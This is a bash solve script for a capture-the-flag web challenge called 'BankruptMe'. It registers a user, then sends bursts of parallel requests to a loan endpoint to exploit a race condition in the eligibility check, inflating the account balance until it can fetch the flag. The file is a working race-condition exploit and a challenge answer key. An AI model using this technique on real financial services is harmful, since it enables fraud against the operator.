#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
#  BankruptMe — automated solve script
#  Exploits the loan race condition (Step 2) to reach 1,000,000 DA
#  Usage: ./solve.sh [base_url]   default: http://localhost:8080
# ─────────────────────────────────────────────────────────────────────────────

set -eu

BASE="${1:-http://localhost:8080}"
RAND=$(cat /proc/sys/kernel/random/uuid | tr -d '-' | cut -c1-8)
USER="solver_${RAND}"
PASS="S0lv3r!${RAND:0:4}"
JAR=$(mktemp /tmp/bnm_cookies_XXXXXX.txt)

cleanup() { rm -f "$JAR"; }
trap cleanup EXIT

echo "═══════════════════════════════════════"
echo "  BankruptMe — solve.sh"
echo "  Target : $BASE"
echo "═══════════════════════════════════════"

# ── 1. Register ───────────────────────────────────────────────────────────────
echo "[1] Registering account: $USER"
curl -s -c "$JAR" "$BASE/register.php" \
  -d "username=${USER}&email=${USER}@solve.local&password=${PASS}" > /dev/null

# ── 2. Login ──────────────────────────────────────────────────────────────────
echo "[2] Logging in..."
HTTP=$(curl -s -o /dev/null -w "%{http_code}" \
  -c "$JAR" -b "$JAR" "$BASE/login.php" \
  -d "username=${USER}&password=${PASS}")

if [[ "$HTTP" != "302" && "$HTTP" != "200" ]]; then
  echo "[!] Login may have failed (HTTP $HTTP). Continuing anyway..."
fi

# ── 3. Race condition on /loan.php ────────────────────────────────────────────
# Fire multiple rounds of parallel requests to ensure at least two hit the
# eligibility check before either completes the INSERT (80 ms window).
race_round() {
  for i in $(seq 1 8); do
    curl -s -b "$JAR" -X POST "$BASE/loan.php" > /dev/null &
  done
  wait
}

echo "[3] Triggering race condition..."
for round in 1 2 3; do
  echo "    Round $round — firing 8 parallel loan requests..."
  race_round

  BALANCE=$(curl -s -b "$JAR" "$BASE/index.php" \
    | grep -oP '[0-9,]+\.[0-9]{2} DA' | grep -m1 '' || true)
  echo "    Balance after round $round: ${BALANCE:-unknown}"

  # Check if we already crossed the threshold
  NUMERIC=$(echo "${BALANCE//,/}" | grep -oP '^[0-9]+' || echo 0)
  if [[ "$NUMERIC" -ge 1000000 ]]; then
    echo "    Threshold reached!"
    break
  fi
done

# ── 4. Grab flag ──────────────────────────────────────────────────────────────
echo "[4] Fetching /vip.php..."
VIP_PAGE=$(curl -s -b "$JAR" "$BASE/vip.php")
FLAG=$(echo "$VIP_PAGE" | grep -oP 'mctf\{[^}]+\}' | grep -m1 '' || true)

echo ""
if [[ -n "$FLAG" ]]; then
  echo "╔══════════════════════════════════════════╗"
  echo "  FLAG: $FLAG"
  echo "╚══════════════════════════════════════════╝"
else
  echo "[!] Flag not found. Balance: ${BALANCE:-unknown}"
  echo "    Try running the script again."
  exit 1
fi
